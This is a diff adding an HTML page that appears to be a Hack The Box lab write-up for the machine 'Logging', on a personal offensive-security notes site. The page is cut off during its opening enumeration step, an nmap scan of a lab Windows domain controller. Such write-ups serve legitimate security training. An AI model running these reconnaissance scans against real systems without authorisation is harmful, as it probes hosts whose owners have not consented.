@@ -1,0 +1,1663 @@
+<!doctype html>
+<html class="no-js" lang="en" data-content_root="">
+  <head><meta charset="utf-8"/>
+    <meta name="viewport" content="width=device-width,initial-scale=1"/>
+    <meta name="color-scheme" content="light dark"><meta name="viewport" content="width=device-width, initial-scale=1" />
+
+    <!-- Google tag (gtag.js) -->
+    <script async src="https://www.googletagmanager.com/gtag/js?id=G-2TCTE0JE23"></script>
+    <script>
+        window.dataLayer = window.dataLayer || [];
+        function gtag(){dataLayer.push(arguments);}
+        gtag('js', new Date());
+        gtag('config', 'G-2TCTE0JE23');
+    </script>
+        <link href="../../../../_static/lazer_fox.png" sizes="300x300" rel="icon" type="image/png"><link rel="index" title="Index" href="../../../../genindex.html" /><link rel="search" title="Search" href="../../../../search.html" /><link rel="next" title="Manager" href="../manager/manager.html" /><link rel="prev" title="Jupiter" href="../jupiter/jupiter.html" />
+
+    <!-- Generated with Sphinx 7.1.2 and Furo 2023.08.19 -->
+        <title>Logging - blnkn&#39;s notes</title>
+      <link rel="stylesheet" type="text/css" href="../../../../_static/pygments.css?v=8f2a1f02" />
+    <link rel="stylesheet" type="text/css" href="../../../../_static/styles/furo.css?v=135e06be" />
+    <link rel="stylesheet" type="text/css" href="../../../../_static/styles/furo-extensions.css?v=36a5483c" />
+    
+    
+
+
+<style>
+  body {
+    --color-code-background: #f8f8f8;
+  --color-code-foreground: black;
+  
+  }
+  @media not print {
+    body[data-theme="dark"] {
+      --color-code-background: #202020;
+  --color-code-foreground: #d0d0d0;
+  
+    }
+    @media (prefers-color-scheme: dark) {
+      body:not([data-theme="light"]) {
+        --color-code-background: #202020;
+  --color-code-foreground: #d0d0d0;
+  
+      }
+    }
+  }
+</style></head>
+  <body>
+    
+    <script>
+      document.body.dataset.theme = localStorage.getItem("theme") || "auto";
+    </script>
+    
+
+<svg xmlns="http://www.w3.org/2000/svg" style="display: none;">
+  <symbol id="svg-toc" viewBox="0 0 24 24">
+    <title>Contents</title>
+    <svg stroke="currentColor" fill="currentColor" stroke-width="0" viewBox="0 0 1024 1024">
+      <path d="M408 442h480c4.4 0 8-3.6 8-8v-56c0-4.4-3.6-8-8-8H408c-4.4 0-8 3.6-8 8v56c0 4.4 3.6 8 8 8zm-8 204c0 4.4 3.6 8 8 8h480c4.4 0 8-3.6 8-8v-56c0-4.4-3.6-8-8-8H408c-4.4 0-8 3.6-8 8v56zm504-486H120c-4.4 0-8 3.6-8 8v56c0 4.4 3.6 8 8 8h784c4.4 0 8-3.6 8-8v-56c0-4.4-3.6-8-8-8zm0 632H120c-4.4 0-8 3.6-8 8v56c0 4.4 3.6 8 8 8h784c4.4 0 8-3.6 8-8v-56c0-4.4-3.6-8-8-8zM115.4 518.9L271.7 642c5.8 4.6 14.4.5 14.4-6.9V388.9c0-7.4-8.5-11.5-14.4-6.9L115.4 505.1a8.74 8.74 0 0 0 0 13.8z"/>
+    </svg>
+  </symbol>
+  <symbol id="svg-menu" viewBox="0 0 24 24">
+    <title>Menu</title>
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor"
+      stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather-menu">
+      <line x1="3" y1="12" x2="21" y2="12"></line>
+      <line x1="3" y1="6" x2="21" y2="6"></line>
+      <line x1="3" y1="18" x2="21" y2="18"></line>
+    </svg>
+  </symbol>
+  <symbol id="svg-arrow-right" viewBox="0 0 24 24">
+    <title>Expand</title>
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor"
+      stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather-chevron-right">
+      <polyline points="9 18 15 12 9 6"></polyline>
+    </svg>
+  </symbol>
+  <symbol id="svg-sun" viewBox="0 0 24 24">
+    <title>Light mode</title>
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor"
+      stroke-width="1.5" stroke-linecap="round" stroke-linejoin="round" class="feather-sun">
+      <circle cx="12" cy="12" r="5"></circle>
+      <line x1="12" y1="1" x2="12" y2="3"></line>
+      <line x1="12" y1="21" x2="12" y2="23"></line>
+      <line x1="4.22" y1="4.22" x2="5.64" y2="5.64"></line>
+      <line x1="18.36" y1="18.36" x2="19.78" y2="19.78"></line>
+      <line x1="1" y1="12" x2="3" y2="12"></line>
+      <line x1="21" y1="12" x2="23" y2="12"></line>
+      <line x1="4.22" y1="19.78" x2="5.64" y2="18.36"></line>
+      <line x1="18.36" y1="5.64" x2="19.78" y2="4.22"></line>
+    </svg>
+  </symbol>
+  <symbol id="svg-moon" viewBox="0 0 24 24">
+    <title>Dark mode</title>
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor"
+      stroke-width="1.5" stroke-linecap="round" stroke-linejoin="round" class="icon-tabler-moon">
+      <path stroke="none" d="M0 0h24v24H0z" fill="none" />
+      <path d="M12 3c.132 0 .263 0 .393 0a7.5 7.5 0 0 0 7.92 12.446a9 9 0 1 1 -8.313 -12.454z" />
+    </svg>
+  </symbol>
+  <symbol id="svg-sun-half" viewBox="0 0 24 24">
+    <title>Auto light/dark mode</title>
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor"
+      stroke-width="1.5" stroke-linecap="round" stroke-linejoin="round" class="icon-tabler-shadow">
+      <path stroke="none" d="M0 0h24v24H0z" fill="none"/>
+      <circle cx="12" cy="12" r="9" />
+      <path d="M13 12h5" />
+      <path d="M13 15h4" />
+      <path d="M13 18h1" />
+      <path d="M13 9h4" />
+      <path d="M13 6h1" />
+    </svg>
+  </symbol>
+</svg>
+
+<input type="checkbox" class="sidebar-toggle" name="__navigation" id="__navigation">
+<input type="checkbox" class="sidebar-toggle" name="__toc" id="__toc">
+<label class="overlay sidebar-overlay" for="__navigation">
+  <div class="visually-hidden">Hide navigation sidebar</div>
+</label>
+<label class="overlay toc-overlay" for="__toc">
+  <div class="visually-hidden">Hide table of contents sidebar</div>
+</label>
+
+
+
+<div class="page">
+  <header class="mobile-header">
+    <div class="header-left">
+      <label class="nav-overlay-icon" for="__navigation">
+        <div class="visually-hidden">Toggle site navigation sidebar</div>
+        <i class="icon"><svg><use href="#svg-menu"></use></svg></i>
+      </label>
+    </div>
+    <div class="header-center">
+      <a href="../../../../index.html"><div class="brand">blnkn's notes</div></a>
+    </div>
+    <div class="header-right">
+      <div class="theme-toggle-container theme-toggle-header">
+        <button class="theme-toggle">
+          <div class="visually-hidden">Toggle Light / Dark / Auto color theme</div>
+          <svg class="theme-icon-when-auto"><use href="#svg-sun-half"></use></svg>
+          <svg class="theme-icon-when-dark"><use href="#svg-moon"></use></svg>
+          <svg class="theme-icon-when-light"><use href="#svg-sun"></use></svg>
+        </button>
+      </div>
+      <label class="toc-overlay-icon toc-header-icon" for="__toc">
+        <div class="visually-hidden">Toggle table of contents sidebar</div>
+        <i class="icon"><svg><use href="#svg-toc"></use></svg></i>
+      </label>
+    </div>
+  </header>
+  <aside class="sidebar-drawer">
+    <div class="sidebar-container">
+      
+      <div class="sidebar-sticky"><a class="sidebar-brand" href="../../../../index.html">
+  
+  <div class="sidebar-logo-container">
+    <img class="sidebar-logo" src="../../../../_static/lazer_fox.png" alt="Logo"/>
+  </div>
+  
+  <span class="sidebar-brand-text">blnkn's notes</span>
+  
+</a><form class="sidebar-search-container" method="get" action="../../../../search.html" role="search">
+  <input class="sidebar-search" placeholder="Search" name="q" aria-label="Search">
+  <input type="hidden" name="check_keywords" value="yes">
+  <input type="hidden" name="area" value="default">
+</form>
+<div id="searchbox"></div><div class="sidebar-scroll"><div class="sidebar-tree">
+  <p class="caption" role="heading"><span class="caption-text">Contents:</span></p>
+<ul class="current">
+<li class="toctree-l1 current has-children"><a class="reference internal" href="../../../htb.html">Hack The Box</a><input checked="" class="toctree-checkbox" id="toctree-checkbox-1" name="toctree-checkbox-1" role="switch" type="checkbox"/><label for="toctree-checkbox-1"><div class="visually-hidden">Toggle navigation of Hack The Box</div><i class="icon"><svg><use href="#svg-arrow-right"></use></svg></i></label><ul class="current">
+<li class="toctree-l2 has-children"><a class="reference internal" href="../../../academy/academy.html">Academy</a><input class="toctree-checkbox" id="toctree-checkbox-2" name="toctree-checkbox-2" role="switch" type="checkbox"/><label for="toctree-checkbox-2"><div class="visually-hidden">Toggle navigation of Academy</div><i class="icon"><svg><use href="#svg-arrow-right"></use></svg></i></label><ul>
+<li class="toctree-l3 has-children"><a class="reference internal" href="../../../academy/active-directory/active-directory.html">Active Directory</a><input class="toctree-checkbox" id="toctree-checkbox-3" name="toctree-checkbox-3" role="switch" type="checkbox"/><label for="toctree-checkbox-3"><div class="visually-hidden">Toggle navigation of Active Directory</div><i class="icon"><svg><use href="#svg-arrow-right"></use></svg></i></label><ul>
+<li class="toctree-l4"><a class="reference internal" href="../../../academy/active-directory/active-directory-enum-and-attacks/active-directory-enum-and-attacks.html">Active Directory Enum and Attacks</a></li>
+<li class="toctree-l4"><a class="reference internal" href="../../../academy/active-directory/ad/ad.html">Active Directory</a></li>
+<li class="toctree-l4"><a class="reference internal" href="../../../academy/active-directory/ad/ad.html#user-account-control-values">User Account Control Values</a></li>
+<li class="toctree-l4"><a class="reference internal" href="../../../academy/active-directory/kerberos/kerberos.html">Kerberos</a></li>
+<li class="toctree-l4"><a class="reference internal" href="../../../academy/active-directory/windows-auth/windows-auth.html">Windows Authentication</a></li>
+</ul>
+</li>
+<li class="toctree-l3 has-children"><a class="reference internal" href="../../../academy/buffer-overflows/buffer-overflows.html">Buffer Overflows</a><input class="toctree-checkbox" id="toctree-checkbox-4" name="toctree-checkbox-4" role="switch" type="checkbox"/><label for="toctree-checkbox-4"><div class="visually-hidden">Toggle navigation of Buffer Overflows</div><i class="icon"><svg><use href="#svg-arrow-right"></use></svg></i></label><ul>
+<li class="toctree-l4"><a class="reference internal" href="../../../academy/buffer-overflows/linux-buffer-overflows/linux-buffer-overflows.html">Linux Buffer Overflows</a></li>
+</ul>
+</li>
+<li class="toctree-l3"><a class="reference internal" href="../../../academy/hashcat/hashcat.html">Hashcat</a></li>
+<li class="toctree-l3 has-children"><a class="reference internal" href="../../../academy/os-fundamentals/os-fundamentals.html">OS Fundamentals</a><input class="toctree-checkbox" id="toctree-checkbox-5" name="toctree-checkbox-5" role="switch" type="checkbox"/><label for="toctree-checkbox-5"><div class="visually-hidden">Toggle navigation of OS Fundamentals</div><i class="icon"><svg><use href="#svg-arrow-right"></use></svg></i></label><ul>
+<li class="toctree-l4"><a class="reference internal" href="../../../academy/os-fundamentals/windows-fundamentals/windows-fundamentals.html">Windows OS Fundamentals</a></li>
+</ul>
+</li>
+<li class="toctree-l3"><a class="reference internal" href="../../../academy/sqli/sqli.html">SQLi</a></li>
+<li class="toctree-l3"><a class="reference internal" href="../../../academy/webapp/webapp.html">Web Apps</a></li>
+</ul>
+</li>
+<li class="toctree-l2 current has-children"><a class="reference internal" href="../../machines.html">Lab Machines</a><input checked="" class="toctree-checkbox" id="toctree-checkbox-6" name="toctree-checkbox-6" role="switch" type="checkbox"/><label for="toctree-checkbox-6"><div class="visually-hidden">Toggle navigation of Lab Machines</div><i class="icon"><svg><use href="#svg-arrow-right"></use></svg></i></label><ul class="current">
+<li class="toctree-l3 has-children"><a class="reference internal" href="../../hard/hard.html">Hard</a><input class="toctree-checkbox" id="toctree-checkbox-7" name="toctree-checkbox-7" role="switch" type="checkbox"/><label for="toctree-checkbox-7"><div class="visually-hidden">Toggle navigation of Hard</div><i class="icon"><svg><use href="#svg-arrow-right"></use></svg></i></label><ul>
+<li class="toctree-l4"><a class="reference internal" href="../../hard/snoopy/snoopy.html">Snoopy</a></li>
+<li class="toctree-l4"><a class="reference internal" href="../../hard/vintage/vintage.html">Vintage</a></li>
+</ul>
+</li>
+<li class="toctree-l3 current has-children"><a class="reference internal" href="../medium.html">Medium</a><input checked="" class="toctree-checkbox" id="toctree-checkbox-8" name="toctree-checkbox-8" role="switch" type="checkbox"/><label for="toctree-checkbox-8"><div class="visually-hidden">Toggle navigation of Medium</div><i class="icon"><svg><use href="#svg-arrow-right"></use></svg></i></label><ul class="current">
+<li class="toctree-l4"><a class="reference internal" href="../administrator/administrator.html">Administrator</a></li>
+<li class="toctree-l4"><a class="reference internal" href="../ambassador/ambassador.html">Ambassador</a></li>
+<li class="toctree-l4"><a class="reference internal" href="../authority/authority.html">Authority</a></li>
+<li class="toctree-l4"><a class="reference internal" href="../awkward/awkward.html">Awkward</a></li>
+<li class="toctree-l4"><a class="reference internal" href="../faculty/faculty.html">Faculty</a></li>
+<li class="toctree-l4"><a class="reference internal" href="../forgot/forgot.html">Forgot</a></li>
+<li class="toctree-l4"><a class="reference internal" href="../format/format.html">Format</a></li>
+<li class="toctree-l4"><a class="reference internal" href="../health/health.html">Health</a></li>
+<li class="toctree-l4"><a class="reference internal" href="../jupiter/jupiter.html">Jupiter</a></li>
+<li class="toctree-l4 current current-page"><a class="current reference internal" href="#">Logging</a></li>
+<li class="toctree-l4"><a class="reference internal" href="../manager/manager.html">Manager</a></li>
+<li class="toctree-l4"><a class="reference internal" href="../mentor/mentor.html">Mentor</a></li>
+<li class="toctree-l4"><a class="reference internal" href="../only4you/only4you.html">Only4you</a></li>
+<li class="toctree-l4"><a class="reference internal" href="../outdated/outdated.html">Outdated</a></li>
+<li class="toctree-l4"><a class="reference internal" href="../sandworm/sandworm.html">Sandworm</a></li>
+<li class="toctree-l4"><a class="reference internal" href="../scrambled/scrambled.html">Scrambled</a></li>
+<li class="toctree-l4"><a class="reference internal" href="../shared/shared.html">Shared</a></li>
+<li class="toctree-l4"><a class="reference internal" href="../thefrizz/thefrizz.html">The Frizz</a></li>
+<li class="toctree-l4"><a class="reference internal" href="../updown/updown.html">Updown</a></li>
+<li class="toctree-l4"><a class="reference internal" href="../zipping/zipping.html">Zipping</a></li>
+</ul>
+</li>
+<li class="toctree-l3 has-children"><a class="reference internal" href="../../easy/easy.html">Easy</a><input class="toctree-checkbox" id="toctree-checkbox-9" name="toctree-checkbox-9" role="switch" type="checkbox"/><label for="toctree-checkbox-9"><div class="visually-hidden">Toggle navigation of Easy</div><i class="icon"><svg><use href="#svg-arrow-right"></use></svg></i></label><ul>
+<li class="toctree-l4"><a class="reference internal" href="../../easy/analytics/analytics.html">Analytics</a></li>
+<li class="toctree-l4"><a class="reference internal" href="../../easy/busqueda/busqueda.html">Busqueda</a></li>
+<li class="toctree-l4"><a class="reference internal" href="../../easy/code/code.html">Code</a></li>
+<li class="toctree-l4"><a class="reference internal" href="../../easy/codify/codify.html">Codify</a></li>
+<li class="toctree-l4"><a class="reference internal" href="../../easy/dog/dog.html">Dog</a></li>
+<li class="toctree-l4"><a class="reference internal" href="../../easy/escapetwo/escapetwo.html">Escape Two</a></li>
+<li class="toctree-l4"><a class="reference internal" href="../../easy/facts/facts.html">Facts</a></li>
+<li class="toctree-l4"><a class="reference internal" href="../../easy/inject/inject.html">Inject</a></li>
+<li class="toctree-l4"><a class="reference internal" href="../../easy/keeper/keeper.html">Keeper</a></li>
+<li class="toctree-l4"><a class="reference internal" href="../../easy/metatwo/metatwo.html">Meta two</a></li>
+<li class="toctree-l4"><a class="reference internal" href="../../easy/monitorstwo/monitorstwo.html">Monitors two</a></li>
+<li class="toctree-l4"><a class="reference internal" href="../../easy/pc/pc.html">Pc</a></li>
+<li class="toctree-l4"><a class="reference internal" href="../../easy/photobomb/photobomb.html">Photobomb</a></li>
+<li class="toctree-l4"><a class="reference internal" href="../../easy/pilgrimage/pilgrimage.html">Pilgrimage</a></li>
+<li class="toctree-l4"><a class="reference internal" href="../../easy/precious/precious.html">Precious</a></li>
+<li class="toctree-l4"><a class="reference internal" href="../../easy/red_panda/red_panda.html">Red panda</a></li>
+<li class="toctree-l4"><a class="reference internal" href="../../easy/sau/sau.html">Sau</a></li>
+<li class="toctree-l4"><a class="reference internal" href="../../easy/shoppy/shoppy.html">Shoppy</a></li>
+<li class="toctree-l4"><a class="reference internal" href="../../easy/soccer/soccer.html">Soccer</a></li>
+<li class="toctree-l4"><a class="reference internal" href="../../easy/stocker/stocker.html">Stocker</a></li>
+<li class="toctree-l4"><a class="reference internal" href="../../easy/support/support.html">Support</a></li>
+<li class="toctree-l4"><a class="reference internal" href="../../easy/topology/topology.html">Topology</a></li>
+<li class="toctree-l4"><a class="reference internal" href="../../easy/trick/trick.html">Trick</a></li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+</li>
+<li class="toctree-l1 has-children"><a class="reference internal" href="../../../../pg/pg.html">Proving Grounds</a><input class="toctree-checkbox" id="toctree-checkbox-10" name="toctree-checkbox-10" role="switch" type="checkbox"/><label for="toctree-checkbox-10"><div class="visually-hidden">Toggle navigation of Proving Grounds</div><i class="icon"><svg><use href="#svg-arrow-right"></use></svg></i></label><ul>
+<li class="toctree-l2"><a class="reference internal" href="../../../../pg/ha_natraj/ha_natraj.html">Ha Natraj</a></li>
+<li class="toctree-l2"><a class="reference internal" href="../../../../pg/sunset_decoy/sunset_decoy.html">Sunset Decoy</a></li>
+</ul>
+</li>
+<li class="toctree-l1 has-children"><a class="reference internal" href="../../../../dvwa/dvwa.html">DVWA</a><input class="toctree-checkbox" id="toctree-checkbox-11" name="toctree-checkbox-11" role="switch" type="checkbox"/><label for="toctree-checkbox-11"><div class="visually-hidden">Toggle navigation of DVWA</div><i class="icon"><svg><use href="#svg-arrow-right"></use></svg></i></label><ul>
+<li class="toctree-l2"><a class="reference internal" href="../../../../dvwa/sqli_blind/sqli_blind.html">Blind SQLi</a></li>
+</ul>
+</li>
+<li class="toctree-l1 has-children"><a class="reference internal" href="../../../../other/other.html">Other</a><input class="toctree-checkbox" id="toctree-checkbox-12" name="toctree-checkbox-12" role="switch" type="checkbox"/><label for="toctree-checkbox-12"><div class="visually-hidden">Toggle navigation of Other</div><i class="icon"><svg><use href="#svg-arrow-right"></use></svg></i></label><ul>
+<li class="toctree-l2"><a class="reference internal" href="../../../../other/assembly/assembly.html">Assembly</a></li>
+<li class="toctree-l2 has-children"><a class="reference internal" href="../../../../other/aws-ccp/aws-ccp.html">AWS-CCP</a><input class="toctree-checkbox" id="toctree-checkbox-13" name="toctree-checkbox-13" role="switch" type="checkbox"/><label for="toctree-checkbox-13"><div class="visually-hidden">Toggle navigation of AWS-CCP</div><i class="icon"><svg><use href="#svg-arrow-right"></use></svg></i></label><ul>
+<li class="toctree-l3"><a class="reference internal" href="../../../../other/aws-ccp/1-foundations-of-cloud-computing.html">Foundations of Cloud Computing</a></li>
+<li class="toctree-l3"><a class="reference internal" href="../../../../other/aws-ccp/2-technology.html">Technologies</a></li>
+<li class="toctree-l3"><a class="reference internal" href="../../../../other/aws-ccp/3-security-and-compliance.html">Security and Compliance</a></li>
+<li class="toctree-l3"><a class="reference internal" href="../../../../other/aws-ccp/4-pricing-billing-and-governance.html">Pricing Billing and Governance</a></li>
+</ul>
+</li>
+<li class="toctree-l2"><a class="reference internal" href="../../../../other/codebashing/codebashing.html">Codebashing</a></li>
+<li class="toctree-l2"><a class="reference internal" href="../../../../other/dba/dba.html">Database Administration</a></li>
+<li class="toctree-l2"><a class="reference internal" href="../../../../other/dorking/dorking.html">Google dork cheatsheet</a></li>
+<li class="toctree-l2"><a class="reference internal" href="../../../../other/empire/empire.html">Empire</a></li>
+<li class="toctree-l2"><a class="reference internal" href="../../../../other/hashes/hashes.html">Hashes</a></li>
+<li class="toctree-l2"><a class="reference internal" href="../../../../other/irssi/irssi.html">Irssi</a></li>
+<li class="toctree-l2"><a class="reference internal" href="../../../../other/metasploit/metasploit.html">Metasploit framework</a></li>
+<li class="toctree-l2"><a class="reference internal" href="../../../../other/nmap/nmap.html">Nmap</a></li>
+<li class="toctree-l2"><a class="reference internal" href="../../../../other/reconstructing-private-key/reconstructing-private-key.html">Reconstructing a Private Key</a></li>
+<li class="toctree-l2"><a class="reference internal" href="../../../../other/rfid/rfid.html">RFID</a></li>
+<li class="toctree-l2"><a class="reference internal" href="../../../../other/server-hardening/server-hardening.html">Server Hardening</a></li>
+<li class="toctree-l2"><a class="reference internal" href="../../../../other/shells/shells.html">Reverse Shells</a></li>
+<li class="toctree-l2"><a class="reference internal" href="../../../../other/stego/stego.html">Steganography</a></li>
+<li class="toctree-l2"><a class="reference internal" href="../../../../other/tcpdump-vuln/tcpdump-vuln.html">TCPdump</a></li>
+<li class="toctree-l2"><a class="reference internal" href="../../../../other/wordlists/wordlists.html">Making Custom Wordlists</a></li>
+<li class="toctree-l2 has-children"><a class="reference internal" href="../../../../other/c/c.html">C</a><input class="toctree-checkbox" id="toctree-checkbox-14" name="toctree-checkbox-14" role="switch" type="checkbox"/><label for="toctree-checkbox-14"><div class="visually-hidden">Toggle navigation of C</div><i class="icon"><svg><use href="#svg-arrow-right"></use></svg></i></label><ul>
+<li class="toctree-l3"><a class="reference internal" href="../../../../other/c/execution-methods.html">C Execution methods</a></li>
+</ul>
+</li>
+<li class="toctree-l2"><a class="reference internal" href="../../../../other/air-ungap/air-ungap.html">Air-Ungap</a></li>
+</ul>
+</li>
+</ul>
+
+</div>
+</div>
+
+      </div>
+      
+    </div>
+  </aside>
+  <div class="main">
+    <div class="content">
+      <div class="article-container">
+        <a href="#" class="back-to-top muted-link">
+          <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24">
+            <path d="M13 20h-2V8l-5.5 5.5-1.42-1.42L12 4.16l7.92 7.92-1.42 1.42L13 8v12z"></path>
+          </svg>
+          <span>Back to top</span>
+        </a>
+        <div class="content-icon-container">
+          
+<div class="theme-toggle-container theme-toggle-content">
+            <button class="theme-toggle">
+              <div class="visually-hidden">Toggle Light / Dark / Auto color theme</div>
+              <svg class="theme-icon-when-auto"><use href="#svg-sun-half"></use></svg>
+              <svg class="theme-icon-when-dark"><use href="#svg-moon"></use></svg>
+              <svg class="theme-icon-when-light"><use href="#svg-sun"></use></svg>
+            </button>
+          </div>
+          <label class="toc-overlay-icon toc-content-icon" for="__toc">
+            <div class="visually-hidden">Toggle table of contents sidebar</div>
+            <i class="icon"><svg><use href="#svg-toc"></use></svg></i>
+          </label>
+        </div>
+        <article role="main">
+          <!-- markdownlint-disable MD013 -->
+<!-- markdownlint-disable MD041 -->
+<p><img alt="Logging.png" src="../../../../_images/logging.png" /></p>
+<section id="logging">
+<h1>Logging<a class="headerlink" href="#logging" title="Permalink to this heading">#</a></h1>
+<section id="enum">
+<h2>Enum<a class="headerlink" href="#enum" title="Permalink to this heading">#</a></h2>
+<div class="highlight-bash notranslate"><div class="highlight"><pre><span></span>nmap<span class="w"> </span>-Pn<span class="w"> </span>-sC<span class="w"> </span>-sV<span class="w"> </span><span class="m">10</span>.129.35.59<span class="w"> </span>-oN<span class="w"> </span>scans/initial.nmap
+Starting<span class="w"> </span>Nmap<span class="w"> </span><span class="m">7</span>.98<span class="w"> </span><span class="o">(</span><span class="w"> </span>https://nmap.org<span class="w"> </span><span class="o">)</span><span class="w"> </span>at<span class="w"> </span><span class="m">2026</span>-04-19<span class="w"> </span><span class="m">19</span>:39<span class="w"> </span>+0100
+Nmap<span class="w"> </span>scan<span class="w"> </span>report<span class="w"> </span><span class="k">for</span><span class="w"> </span><span class="m">10</span>.129.35.59
+Host<span class="w"> </span>is<span class="w"> </span>up<span class="w"> </span><span class="o">(</span><span class="m">0</span>.048s<span class="w"> </span>latency<span class="o">)</span>.
+Not<span class="w"> </span>shown:<span class="w"> </span><span class="m">987</span><span class="w"> </span>closed<span class="w"> </span>tcp<span class="w"> </span>ports<span class="w"> </span><span class="o">(</span>conn-refused<span class="o">)</span>
+PORT<span class="w">     </span>STATE<span class="w"> </span>SERVICE<span class="w">       </span>VERSION
+<span class="m">53</span>/tcp<span class="w">   </span>open<span class="w">  </span>domain<span class="w">        </span>Simple<span class="w"> </span>DNS<span class="w"> </span>Plus
+<span class="m">80</span>/tcp<span class="w">   </span>open<span class="w">  </span>http<span class="w">          </span>Microsoft<span class="w"> </span>IIS<span class="w"> </span>httpd<span class="w"> </span><span class="m">10</span>.0
+<span class="p">|</span><span class="w"> </span>http-methods:
+<span class="p">|</span>_<span class="w">  </span>Potentially<span class="w"> </span>risky<span class="w"> </span>methods:<span class="w"> </span>TRACE
+<span class="p">|</span>_http-server-header:<span class="w"> </span>Microsoft-IIS/10.0
+<span class="p">|</span>_http-title:<span class="w"> </span>IIS<span class="w"> </span>Windows<span class="w"> </span>Server
+<span class="m">88</span>/tcp<span class="w">   </span>open<span class="w">  </span>kerberos-sec<span class="w">  </span>Microsoft<span class="w"> </span>Windows<span class="w"> </span>Kerberos<span class="w"> </span><span class="o">(</span>server<span class="w"> </span>time:<span class="w"> </span><span class="m">2026</span>-04-20<span class="w"> </span><span class="m">01</span>:47:02Z<span class="o">)</span>
+<span class="m">135</span>/tcp<span class="w">  </span>open<span class="w">  </span>msrpc<span class="w">         </span>Microsoft<span class="w"> </span>Windows<span class="w"> </span>RPC
+<span class="m">139</span>/tcp<span class="w">  </span>open<span class="w">  </span>netbios-ssn<span class="w">   </span>Microsoft<span class="w"> </span>Windows<span class="w"> </span>netbios-ssn
+<span class="m">389</span>/tcp<span class="w">  </span>open<span class="w">  </span>ldap<span class="w">          </span>Microsoft<span class="w"> </span>Windows<span class="w"> </span>Active<span class="w"> </span>Directory<span class="w"> </span>LDAP<span class="w"> </span><span class="o">(</span>Domain:<span class="w"> </span>logging.htb,<span class="w"> </span>Site:<span class="w"> </span>Default-First-Site-Name<span class="o">)</span>
+<span class="p">|</span><span class="w"> </span>ssl-cert:<span class="w"> </span>Subject:
+<span class="p">|</span><span class="w"> </span>Subject<span class="w"> </span>Alternative<span class="w"> </span>Name:<span class="w"> </span>DNS:DC01.logging.htb,<span class="w"> </span>DNS:logging.htb,<span class="w"> </span>DNS:logging
+<span class="p">|</span><span class="w"> </span>Not<span class="w"> </span>valid<span class="w"> </span>before:<span class="w"> </span><span class="m">2026</span>-04-17T03:20:01
+<span class="p">|</span>_Not<span class="w"> </span>valid<span class="w"> </span>after:<span class="w">  </span><span class="m">2106</span>-04-17T03:20:01
+<span class="p">|</span>_ssl-date:<span class="w"> </span><span class="m">2026</span>-04-20T01:47:53+00:00<span class="p">;</span><span class="w"> </span>+7h07m17s<span class="w"> </span>from<span class="w"> </span>scanner<span class="w"> </span>time.
+<span class="m">445</span>/tcp<span class="w">  </span>open<span class="w">  </span>microsoft-ds?
+<span class="m">464</span>/tcp<span class="w">  </span>open<span class="w">  </span>kpasswd5?
+<span class="m">593</span>/tcp<span class="w">  </span>open<span class="w">  </span>ncacn_http<span class="w">    </span>Microsoft<span class="w"> </span>Windows<span class="w"> </span>RPC<span class="w"> </span>over<span class="w"> </span>HTTP<span class="w"> </span><span class="m">1</span>.0
+<span class="m">636</span>/tcp<span class="w">  </span>open<span class="w">  </span>ssl/ldap<span class="w">      </span>Microsoft<span class="w"> </span>Windows<span class="w"> </span>Active<span class="w"> </span>Directory<span class="w"> </span>LDAP<span class="w"> </span><span class="o">(</span>Domain:<span class="w"> </span>logging.htb,<span class="w"> </span>Site:<span class="w"> </span>Default-First-Site-Name<span class="o">)</span>
+<span class="p">|</span><span class="w"> </span>ssl-cert:<span class="w"> </span>Subject:
+<span class="p">|</span><span class="w"> </span>Subject<span class="w"> </span>Alternative<span class="w"> </span>Name:<span class="w"> </span>DNS:DC01.logging.htb,<span class="w"> </span>DNS:logging.htb,<span class="w"> </span>DNS:logging
+<span class="p">|</span><span class="w"> </span>Not<span class="w"> </span>valid<span class="w"> </span>before:<span class="w"> </span><span class="m">2026</span>-04-17T03:20:01
+<span class="p">|</span>_Not<span class="w"> </span>valid<span class="w"> </span>after:<span class="w">  </span><span class="m">2106</span>-04-17T03:20:01
+<span class="p">|</span>_ssl-date:<span class="w"> </span><span class="m">2026</span>-04-20T01:47:52+00:00<span class="p">;</span><span class="w"> </span>+7h07m16s<span class="w"> </span>from<span class="w"> </span>scanner<span class="w"> </span>time.
+<span class="m">3268</span>/tcp<span class="w"> </span>open<span class="w">  </span>ldap<span class="w">          </span>Microsoft<span class="w"> </span>Windows<span class="w"> </span>Active<span class="w"> </span>Directory<span class="w"> </span>LDAP<span class="w"> </span><span class="o">(</span>Domain:<span class="w"> </span>logging.htb,<span class="w"> </span>Site:<span class="w"> </span>Default-First-Site-Name<span class="o">)</span>
+<span class="p">|</span><span class="w"> </span>ssl-cert:<span class="w"> </span>Subject:
+<span class="p">|</span><span class="w"> </span>Subject<span class="w"> </span>Alternative<span class="w"> </span>Name:<span class="w"> </span>DNS:DC01.logging.htb,<span class="w"> </span>DNS:logging.htb,<span class="w"> </span>DNS:logging
+<span class="p">|</span><span class="w"> </span>Not<span class="w"> </span>valid<span class="w"> </span>before:<span class="w"> </span><span class="m">2026</span>-04-17T03:20:01
+<span class="p">|</span>_Not<span class="w"> </span>valid<span class="w"> </span>after:<span class="w">  </span><span class="m">2106</span>-04-17T03:20:01
+<span class="p">|</span>_ssl-date:<span class="w"> </span><span class="m">2026</span>-04-20T01:47:53+00:00<span class="p">;</span><span class="w"> </span>+7h07m17s<span class="w"> </span>from<span class="w"> </span>scanner<span class="w"> </span>time.
+<span class="m">3269</span>/tcp<span class="w"> </span>open<span class="w">  </span>ssl/ldap<span class="w">      </span>Microsoft<span class="w"> </span>Windows<span class="w"> </span>Active<span class="w"> </span>Directory<span class="w"> </span>LDAP<span class="w"> </span><span class="o">(</span>Domain:<span class="w"> </span>logging.htb,<span class="w"> </span>Site:<span class="w"> </span>Default-First-Site-Name<span class="o">)</span>
